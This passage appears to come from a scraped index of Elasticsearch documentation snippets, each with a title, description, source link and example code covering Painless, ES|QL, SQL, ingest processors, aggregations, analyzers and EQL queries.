reference types, specifically comparing List objects and their contents.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_19\n\nLANGUAGE: painless\nCODE:\n```\nList a = new ArrayList();\nList b = new ArrayList();\na.add(1);\nboolean c = a == b;\nb.add(1);\nc = a == b;\n```\n\n----------------------------------------\n\nTITLE: HISTOGRAM Example with Date Fields in Elasticsearch SQL\nDESCRIPTION: Shows how to use HISTOGRAM with date fields, grouping birth dates by year intervals and counting records in each bucket.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-grouping.md#2025-04-21_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\nSELECT HISTOGRAM(birth_date, INTERVAL 1 YEAR) AS h, COUNT(*) AS c FROM emp GROUP BY h;\n\n\n           h            |       c\n------------------------+---------------\nnull                    |10\n1952-01-01T00:00:00.000Z|8\n1953-01-01T00:00:00.000Z|11\n1954-01-01T00:00:00.000Z|8\n1955-01-01T00:00:00.000Z|4\n1956-01-01T00:00:00.000Z|5\n1957-01-01T00:00:00.000Z|4\n1958-01-01T00:00:00.000Z|7\n1959-01-01T00:00:00.000Z|9\n1960-01-01T00:00:00.000Z|8\n1961-01-01T00:00:00.000Z|8\n1962-01-01T00:00:00.000Z|6\n1963-01-01T00:00:00.000Z|7\n1964-01-01T00:00:00.000Z|4\n1965-01-01T00:00:00.000Z|1\n```\n\n----------------------------------------\n\nTITLE: Output Document After Merging Conflicts\nDESCRIPTION: Shows how the dot expander handles conflicts by default, merging the values into an array.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/dot-expand-processor.md#2025-04-21_snippet_4\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"foo\" : {\n    \"bar\" : [\"value1\", \"value2\"]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Sample Configuration Download - Docker Setup - Shell\nDESCRIPTION: This shell script snippet downloads a sample configuration file for using the Amazon S3 connector as a self-managed service in Docker. It uses curl to fetch the config from a specified URL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-s3.md#2025-04-21_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\ncurl https://raw.githubusercontent.com/elastic/connectors/main/config.yml.example --output ~/connectors-config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Configuring ICU Tokenizer in Elasticsearch Index Settings\nDESCRIPTION: This snippet demonstrates how to configure an Elasticsearch index to use the ICU tokenizer. It creates a custom analyzer named 'my_icu_analyzer' that uses the 'icu_tokenizer'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-icu-tokenizer.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPUT icu_sample\n{\n  \"settings\": {\n    \"index\": {\n      \"analysis\": {\n        \"analyzer\": {\n          \"my_icu_analyzer\": {\n            \"tokenizer\": \"icu_tokenizer\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Dimension Fields Limit in Elasticsearch\nDESCRIPTION: Configuration for the maximum number of time series dimensions allowed in an index.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/time-series.md#2025-04-21_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nindex.mapping.dimension_fields.limit: 32768\n```\n\n----------------------------------------\n\nTITLE: Including ST_INTERSECTS Function Examples in Markdown\nDESCRIPTION: This code snippet includes usage examples for the ST_INTERSECTS function from a separate markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/st_intersects.md#2025-04-21_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../examples/st_intersects.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Calculating String Length with LENGTH in ESQL\nDESCRIPTION: This snippet demonstrates how to use the LENGTH function in an ESQL query to calculate the character length of a string field. It filters airports in India, keeps only the city field, and adds a new column with the length of each city name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/length.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airports\n| WHERE country == \"India\"\n| KEEP city\n| EVAL fn_length = LENGTH(city)\n```\n\n----------------------------------------\n\nTITLE: Simple Field Matching with MATCH in Elasticsearch SQL\nDESCRIPTION: Example showing how to search for a single term 'frank' in the author field using MATCH, which generates a match query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-search.md#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nSELECT author, name FROM library WHERE MATCH(author, 'frank');\n\n    author     |       name\n---------------+-------------------\nFrank Herbert  |Dune\nFrank Herbert  |Dune Messiah\nFrank Herbert  |Children of Dune\nFrank Herbert  |God Emperor of Dune\n```\n\n----------------------------------------\n\nTITLE: Viewing ML Document Processing Response in Elasticsearch\nDESCRIPTION: Example response from retrieving a document processed by the language identification ML model. It shows both the original text field and the predicted language field with confidence scores for detected languages.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/google-api-services-storage-NOTICE.txt#2025-04-21_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"_index\": \"my_index\",\n  \"_id\": \"1\",\n  \"_version\": 1,\n  \"_seq_no\": 0,\n  \"_primary_term\": 1,\n  \"found\": true,\n  \"_source\": {\n    \"text\": \"The quick brown fox jumps over the lazy dog.\",\n    \"predicted_lang\": {\n      \"predicted_value\": \"en\",\n      \"prediction_probability\": 0.999744,\n      \"prediction_score\": 0.999744,\n      \"lang_score\": {\n        \"ar\": 1.48472E-9,\n        \"bg\": 2.26657E-11,\n        \"bn\": 7.46137E-10,\n        \"cs\": 5.56967E-10,\n        \"da\": 1.14542E-7,\n        \"de\": 3.19231E-8,\n        \"el\": 2.6091E-9,\n        \"en\": 0.999744,\n        \"es\": 6.52424E-9,\n        [...]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Keyword Tokenizer and Trim Filter in Elasticsearch\nDESCRIPTION: This example uses the analyze API with both the keyword tokenizer and the trim filter. It demonstrates how the trim filter removes leading and trailing whitespace from the token.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-trim-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET _analyze\n{\n  \"tokenizer\" : \"keyword\",\n  \"filter\" : [\"trim\"],\n  \"text\" : \" fox \"\n}\n```\n\n----------------------------------------\n\nTITLE: Including GREATEST Function Examples in Markdown\nDESCRIPTION: This snippet includes the content of a separate Markdown file containing examples for the GREATEST function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/greatest.md#2025-04-21_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../examples/greatest.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Categorize Text Aggregation Response in Elasticsearch\nDESCRIPTION: Example of the response structure for a categorize text aggregation, showing the key fields returned for each category bucket.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-categorize-text-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"key\": \"common tokens\",\n  \"doc_count\": 100,\n  \"max_matching_length\": 500,\n  \"regex\": \"common.*tokens\"\n}\n```\n\n----------------------------------------\n\nTITLE: Float Literal Grammar Specification\nDESCRIPTION: Defines the grammar rules for floating-point literals in Painless, including decimal and exponential notations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-literals.md#2025-04-21_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nDECIMAL: '-'? ( '0' | [1-9] [0-9]* ) (DOT [0-9]+)? EXPONENT? [fFdD]?;\nEXPONENT: ( [eE] [+\\-]? [0-9]+ );\n```\n\n----------------------------------------\n\nTITLE: Percolating Queries in a Filter Context for Performance\nDESCRIPTION: This code optimizes the percolating query by using it within a 'constant_score' query wrapper, which improves performance by avoiding score calculations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-percolate-query.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search\n{\n  \"query\": {\n    \"constant_score\": {\n      \"filter\": {\n        \"percolate\": {\n          \"field\": \"query\",\n          \"document\": {\n            \"message\": \"A new bonsai tree in the office\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: IPv4 Prefix Aggregation\nDESCRIPTION: Demonstrates IP prefix aggregation for IPv4 addresses with a prefix length of 24 bits.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-ipprefix-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /network-traffic/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"ipv4-subnets\": {\n      \"ip_prefix\": {\n        \"field\": \"ipv4\",\n        \"prefix_length\": 24\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Cursor-based Pagination in GraphQL Query\nDESCRIPTION: This GraphQL query example demonstrates how to implement cursor-based pagination for fetching user data, which is required for the connector's pagination configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-graphql.md#2025-04-21_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\nquery getUsers($cursor: String!) {\n    sampleData {\n        users(after: $cursor) {\n            pageInfo {\n                endCursor\n                hasNextPage\n            }\n            nodes {\n                first_name\n                last_name\n                address\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Conditional Logic with If/Else Statements in Painless\nDESCRIPTION: Demonstrates the use of if/else conditional statements in Painless to handle different scenarios based on document field values. It checks for missing fields and specific field values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-statements.md#2025-04-21_snippet_0\n\nLANGUAGE: painless\nCODE:\n```\nif (doc[item].size() == 0) {\n  // do something if \"item\" is missing\n} else if (doc[item].value == 'something') {\n  // do something if \"item\" value is: something\n} else {\n  // do something else\n}\n```\n\n----------------------------------------\n\nTITLE: Enabling SSL for Remote Cluster Client in Elasticsearch\nDESCRIPTION: Setting to enable or disable TLS/SSL on the remote cluster client networking layer. Defaults to true for secure communication.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_39\n\nLANGUAGE: properties\nCODE:\n```\nxpack.security.remote_cluster_client.ssl.enabled\n```\n\n----------------------------------------\n\nTITLE: Filtering Unsold Documents Under $25 with Painless Script\nDESCRIPTION: This Painless script filters documents that are not sold and cost less than $25. It demonstrates the use of the 'doc' map to access document fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-filter-context.md#2025-04-21_snippet_0\n\nLANGUAGE: painless\nCODE:\n```\ndoc['sold'].value == false && doc['cost'].value < 25\n```\n\n----------------------------------------\n\nTITLE: Fixed Weekly Bucket Size in ESQL\nDESCRIPTION: Demonstrates using BUCKET with a fixed bucket size of one week, without specifying a range.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/bucket.md#2025-04-21_snippet_3\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| WHERE hire_date >= \"1985-01-01T00:00:00Z\" AND hire_date < \"1986-01-01T00:00:00Z\"\n| STATS hires_per_week = COUNT(*) BY week = BUCKET(hire_date, 1 week)\n| SORT week\n```\n\n----------------------------------------\n\nTITLE: Using Inequality (<> or !=) Operator in Elasticsearch SQL\nDESCRIPTION: Demonstrates how to use the inequality operators (<> or !=) to filter results. This example selects the last_name from test_emp where emp_no is not equal to 10000.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-operators.md#2025-04-21_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\nSELECT last_name l FROM \"test_emp\" WHERE emp_no <> 10000 ORDER BY emp_no LIMIT 5;\n```\n\n----------------------------------------\n\nTITLE: ESQL Less Than or Equal Operator Usage\nDESCRIPTION: The <= operator compares if one field is less than or equal to another. When used with multivalued fields, the operation returns null. This is a fundamental comparison operator used in ESQL queries for numerical and ordinal comparisons.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/layout/less_than_or_equal.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nfield1 <= field2\n```\n\n----------------------------------------\n\nTITLE: Configuring Elasticsearch YAML File in Bash\nDESCRIPTION: Creates and populates the Elasticsearch configuration file with cluster settings, node name, network settings, and security options.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/qa/repository-old-versions-compatibility/src/javaRestTest/resources/README.md#2025-04-21_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ntouch /tmp/sharedESData/config/elasticsearch.yml\n\ncat <<EOF >> /tmp/sharedESData/config/elasticsearch.yml\ncluster.name: \"archive-indides-test\"\nnode.name: \"node-1\"\npath.repo: [\"/usr/share/elasticsearch/snapshots\"]\nnetwork.host: 0.0.0.0\nhttp.port: 9200\n\ndiscovery.type: single-node\nxpack.security.enabled: false\nEOF\n```\n\n----------------------------------------\n\nTITLE: Query Regsvr32 Events with EQL\nDESCRIPTION: EQL query to count events associated with regsvr32.exe processes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-ex-threat-detection.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /my-data-stream/_eql/search?filter_path=-hits.events\n{\n  \"query\": \"\"\"\n    any where process.name == \"regsvr32.exe\"\n  \"\"\",\n  \"size\": 200\n}\n```\n\n----------------------------------------\n\nTITLE: Removing Elasticsearch Instances and Disks on GCP\nDESCRIPTION: This snippet demonstrates how to delete Elasticsearch instances and their associated disks using gcloud commands. It includes commands for stopping and removing instances, as well as deleting associated boot disks.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-cloning.md#2025-04-21_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\n# Stopping and removing instances\ngcloud compute instances delete myesnode1 myesnode2 \\\n       --zone=europe-west1-a\n\n# Consider removing disk as well if you don't need them anymore\ngcloud compute disks delete boot-myesnode1 boot-myesnode2  \\\n       --zone=europe-west1-a\n```\n\n----------------------------------------\n\nTITLE: Indexing Geographic Location Data in Elasticsearch\nDESCRIPTION: The snippet demonstrates how to index documents containing geo_point and geo_shape data. Dependencies include an Elasticsearch instance. Inputs are Elasticsearch PUT requests, and outputs are indexed documents. Considerations include ensuring Elasticsearch is running and accessible.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-bounding-box-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /my_locations\n{\n  \"mappings\": {\n    \"properties\": {\n      \"pin\": {\n        \"properties\": {\n          \"location\": {\n            \"type\": \"geo_point\"\n          }\n        }\n      }\n    }\n  }\n}\n\nPUT /my_locations/_doc/1\n{\n  \"pin\": {\n    \"location\": {\n      \"lat\": 40.12,\n      \"lon\": -71.34\n    }\n  }\n}\n\nPUT /my_geoshapes\n{\n  \"mappings\": {\n    \"properties\": {\n      \"pin\": {\n        \"properties\": {\n          \"location\": {\n            \"type\": \"geo_shape\"\n          }\n        }\n      }\n    }\n  }\n}\n\nPUT /my_geoshapes/_doc/1\n{\n  \"pin\": {\n    \"location\": {\n      \"type\" : \"polygon\",\n      \"coordinates\" : [[[13.0 ,51.5], [15.0, 51.5], [15.0, 54.0], [13.0, 54.0], [13.0 ,51.5]]]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Stored Payloads\nDESCRIPTION: Uses the term vectors API to retrieve the stored tokens and their base64-encoded payloads.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-delimited-payload-tokenfilter.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET text_payloads/_termvectors/1\n{\n  \"fields\": [ \"text\" ],\n  \"payloads\": true\n}\n```\n\n----------------------------------------\n\nTITLE: Input Document Example for JSON Processor without Target Field\nDESCRIPTION: Example of an input document for processing with the JSON processor when no target field is specified. The source_and_target field contains a serialized JSON string.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/json-processor.md#2025-04-21_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"source_and_target\": \"{\\\"foo\\\": 2000}\"\n}\n```\n\n----------------------------------------\n\nTITLE: First Page Search with PIT and Sort in Elasticsearch\nDESCRIPTION: This example demonstrates how to get the first page of results using a PIT ID and sorting. The request specifies a custom date format and numeric type to handle mixed date field types across indices.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/paginate-search-results.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"size\": 10000,\n  \"query\": {\n    \"match\" : {\n      \"user.id\" : \"elkbee\"\n    }\n  },\n  \"pit\": {\n    \"id\":  \"46ToAwMDaWR5BXV1aWQyKwZub2RlXzMAAAAAAAAAACoBYwADaWR4BXV1aWQxAgZub2RlXzEAAAAAAAAAAAEBYQADaWR5BXV1aWQyKgZub2RlXzIAAAAAAAAAAAwBYgACBXV1aWQyAAAFdXVpZDEAAQltYXRjaF9hbGw_gAAAAA==\", <1>\n    \"keep_alive\": \"1m\"\n  },\n  \"sort\": [ <2>\n    {\"@timestamp\": {\"order\": \"asc\", \"format\": \"strict_date_optional_time_nanos\", \"numeric_type\" : \"date_nanos\" }}\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Implicit Grouping with HAVING\nDESCRIPTION: Shows HAVING clause usage with implicit grouping and MIN/MAX aggregations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_23\n\nLANGUAGE: sql\nCODE:\n```\nSELECT MIN(salary) AS min, MAX(salary) AS max FROM emp HAVING min > 25000;\n```\n\n----------------------------------------\n\nTITLE: Auto Date Histogram with Time Zone Example in Elasticsearch\nDESCRIPTION: A complete example demonstrating time zone handling in auto date histogram aggregations. It first indexes three documents with timestamps, then performs an aggregation to bucket them by time.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-autodatehistogram-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_doc/1?refresh\n{\n  \"date\": \"2015-10-01T00:30:00Z\"\n}\n\nPUT my-index-000001/_doc/2?refresh\n{\n  \"date\": \"2015-10-01T01:30:00Z\"\n}\n\nPUT my-index-000001/_doc/3?refresh\n{\n  \"date\": \"2015-10-01T02:30:00Z\"\n}\n\nGET my-index-000001/_search?size=0\n{\n  \"aggs\": {\n    \"by_day\": {\n      \"auto_date_histogram\": {\n        \"field\":     \"date\",\n        \"buckets\" : 3\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Specifying Timestamp and Event Category Fields in EQL Search\nDESCRIPTION: This example shows how to use the timestamp_field and event_category_field parameters to specify custom fields for timestamp and event category in an EQL search query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_20\n\nLANGUAGE: console\nCODE:\n```\nGET /my-data-stream/_eql/search\n{\n  \"timestamp_field\": \"file.accessed\",\n  \"event_category_field\": \"file.type\",\n  \"query\": \"\"\"\n    file where (file.size > 1 and file.type == \"file\")\n  \"\"\"\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Elasticsearch Index Mappings\nDESCRIPTION: This snippet shows how to create index mappings for three different indices (my-index-000001, my-index-000002, my-index-000003) with various field types including IP, date, keyword, and boolean.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_12\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n    \"mappings\": {\n        \"properties\": {\n            \"ip\": {\n                \"type\":\"ip\"\n            },\n            \"version\": {\n                \"type\": \"version\"\n            },\n            \"missing_keyword\": {\n                \"type\": \"keyword\"\n            },\n            \"@timestamp\": {\n              \"type\": \"date\"\n            },\n            \"type_test\": {\n                \"type\": \"keyword\"\n            },\n            \"@timestamp_pretty\": {\n              \"type\": \"date\",\n              \"format\": \"dd-MM-yyyy\"\n            },\n            \"event_type\": {\n              \"type\": \"keyword\"\n            },\n            \"event\": {\n              \"properties\": {\n                \"category\": {\n                  \"type\": \"alias\",\n                  \"path\": \"event_type\"\n                }\n              }\n            },\n            \"host\": {\n              \"type\": \"keyword\"\n            },\n            \"os\": {\n              \"type\": \"keyword\"\n            },\n            \"bool\": {\n              \"type\": \"boolean\"\n            },\n            \"uptime\" : {\n              \"type\" : \"long\"\n            },\n            \"port\" : {\n              \"type\" : \"long\"\n            }\n        }\n    }\n}\n\nPUT /my-index-000002\n{\n    \"mappings\": {\n        \"properties\": {\n            \"ip\": {\n                \"type\":\"ip\"\n            },\n            \"@timestamp\": {\n              \"type\": \"date\"\n            },\n            \"@timestamp_pretty\": {\n              \"type\": \"date\",\n              \"format\": \"yyyy-MM-dd\"\n            },\n            \"type_test\": {\n                \"type\": \"keyword\"\n            },\n            \"event_type\": {\n              \"type\": \"keyword\"\n            },\n            \"event\": {\n              \"properties\": {\n                \"category\": {\n                  \"type\": \"alias\",\n                  \"path\": \"event_type\"\n                }\n              }\n            },\n            \"host\": {\n              \"type\": \"keyword\"\n            },\n            \"op_sys\": {\n              \"type\": \"keyword\"\n            },\n            \"bool\": {\n              \"type\": \"boolean\"\n            },\n            \"uptime\" : {\n              \"type\" : \"long\"\n            },\n            \"port\" : {\n              \"type\" : \"long\"\n            }\n        }\n    }\n}\n\nPUT /my-index-000003\n{\n    \"mappings\": {\n        \"properties\": {\n            \"host_ip\": {\n                \"type\":\"ip\"\n            },\n            \"@timestamp\": {\n              \"type\": \"date\"\n            },\n            \"date\": {\n              \"type\": \"date\"\n            },\n            \"event_type\": {\n              \"type\": \"keyword\"\n            },\n            \"event\": {\n              \"properties\": {\n                \"category\": {\n                  \"type\": \"alias\",\n                  \"path\": \"event_type\"\n                }\n              }\n            },\n            \"missing_keyword\": {\n                \"type\": \"keyword\"\n            },\n            \"host\": {\n              \"type\": \"keyword\"\n            },\n            \"os\": {\n              \"type\": \"keyword\"\n            },\n            \"bool\": {\n              \"type\": \"boolean\"\n            },\n            \"uptime\" : {\n              \"type\" : \"long\"\n            },\n            \"port\" : {\n              \"type\" : \"long\"\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Custom Pattern Definitions in Grok Processor\nDESCRIPTION: Demonstrates how to define custom patterns for the Grok processor using pattern_definitions option.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/grok-processor.md#2025-04-21_snippet_1\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"description\" : \"...\",\n  \"processors\": [\n    {\n      \"grok\": {\n        \"field\": \"message\",\n        \"patterns\": [\"my %{FAVORITE_DOG:dog} is colored %{RGB:color}\"],\n        \"pattern_definitions\" : {\n          \"FAVORITE_DOG\" : \"beagle\",\n          \"RGB\" : \"RED|GREEN|BLUE\"\n        }\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Reindex Status in Elasticsearch\nDESCRIPTION: This snippet shows the response from the reindex status API, displaying progress information for a reindex task on a data stream.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reindex-data-stream.md#2025-04-21_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"start_time_millis\": 1737676174349,\n  \"complete\": false,\n  \"total_indices_in_data_stream\": 4,\n  \"total_indices_requiring_upgrade\": 3,\n  \"successes\": 1,\n  \"in_progress\": [\n    {\n      \"index\": \".ds-my-data-stream-2025.01.23-000002\",\n      \"total_doc_count\": 10000000,\n      \"reindexed_doc_count\": 1000\n    }\n  ],\n  \"pending\": 1,\n  \"errors\": []\n}\n```\n\n----------------------------------------\n\nTITLE: DATE_ADD Example: Subtract Quarters\nDESCRIPTION: Illustrates subtracting quarters from a date value using DATE_ADD with a negative integer. The example shows how to use DATE_ADD to decrement a date by 417 quarters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_25\n\nLANGUAGE: sql\nCODE:\n```\n\"SELECT DATE_ADD('qq', -417, '2019-09-04'::date) AS \\\"-417 quarters\\\";\\n\\n      -417 quarters\n------------------------\n1915-06-04T00:00:00.000Z\"\n```\n\n----------------------------------------\n\nTITLE: Installing the EC2 Discovery Plugin in Elasticsearch\nDESCRIPTION: Command to install the EC2 Discovery plugin using Elasticsearch's plugin manager. The plugin must be installed on every node in the cluster, and each node must be restarted after installation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-ec2.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin install discovery-ec2\n```\n\n----------------------------------------\n\nTITLE: Configuring Nori Number Token Filter in Elasticsearch\nDESCRIPTION: This example demonstrates how to configure an analyzer with nori_number token filter. The setup includes a tokenizer with discard_punctuation set to false and a part_of_speech filter to handle special tokens. The analyzer is then applied to Korean text containing numbers.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-nori-number.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT nori_sample\n{\n  \"settings\": {\n    \"index\": {\n      \"analysis\": {\n        \"analyzer\": {\n          \"my_analyzer\": {\n            \"tokenizer\": \"tokenizer_discard_puncuation_false\",\n            \"filter\": [\n              \"part_of_speech_stop_sp\", \"nori_number\"\n            ]\n          }\n        },\n        \"tokenizer\": {\n          \"tokenizer_discard_puncuation_false\": {\n            \"type\": \"nori_tokenizer\",\n            \"discard_punctuation\": \"false\"\n          }\n        },\n        \"filter\": {\n            \"part_of_speech_stop_sp\": {\n                \"type\": \"nori_part_of_speech\",\n                \"stoptags\": [\"SP\"]\n            }\n        }\n      }\n    }\n  }\n}\n\nGET nori_sample/_analyze\n{\n  \"analyzer\": \"my_analyzer\",\n  \"text\": \"십만이천오백과 ３.２천\"\n}\n```\n\n----------------------------------------\n\nTITLE: DISSECT Append Modifier\nDESCRIPTION: Shows how to use the append modifier to combine multiple matched values\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-process-data-with-dissect-grok.md#2025-04-21_snippet_6\n\nLANGUAGE: esql\nCODE:\n```\nROW message=\"john jacob jingleheimer schmidt\"\n| DISSECT message \"\"\"%{+name} %{+name} %{+name} %{+name}\"\"\" APPEND_SEPARATOR=\" \"\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Query with Parameterized Painless Script Filter\nDESCRIPTION: This Elasticsearch query uses a Painless script as a filter to find available theatre seats for evening performances under a specified cost. The cost is parameterized for flexibility.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-filter-context.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nGET seats/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"filter\": {\n        \"script\": {\n          \"script\": {\n            \"source\": \"doc['sold'].value == false && doc['cost'].value < params.cost\",\n            \"params\": {\n              \"cost\": 25\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Slicing Multi-Value Fields with Positive Indices in ESQL\nDESCRIPTION: This example demonstrates how to use mv_slice function with positive indices to extract elements from a multi-value field. It shows both single element extraction and range extraction.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/mv_slice.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nrow a = [1, 2, 2, 3]\n| eval a1 = mv_slice(a, 1), a2 = mv_slice(a, 2, 3)\n```\n\n----------------------------------------\n\nTITLE: Getting Geometry Type with ST_GeometryType in Elasticsearch SQL\nDESCRIPTION: Returns the type of a geometry object as a string. Possible return values include POINT, MULTIPOINT, LINESTRING, MULTILINESTRING, POLYGON, MULTIPOLYGON, GEOMETRYCOLLECTION, ENVELOPE, or CIRCLE.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-geo.md#2025-04-21_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nST_GeometryType(\n    geometry <1>\n)\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT ST_GeometryType(ST_WKTToSQL('POINT (10 20)')) type;\n\n      type:s\nPOINT\n```\n\n----------------------------------------\n\nTITLE: Foreach Processor Configuration for String Array\nDESCRIPTION: Configuration of the Foreach processor that applies an uppercase transformation to each element in an array of strings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/foreach-processor.md#2025-04-21_snippet_1\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"foreach\" : {\n    \"field\" : \"values\",\n    \"processor\" : {\n      \"uppercase\" : {\n        \"field\" : \"_ingest._value\"\n      }\n    }\n  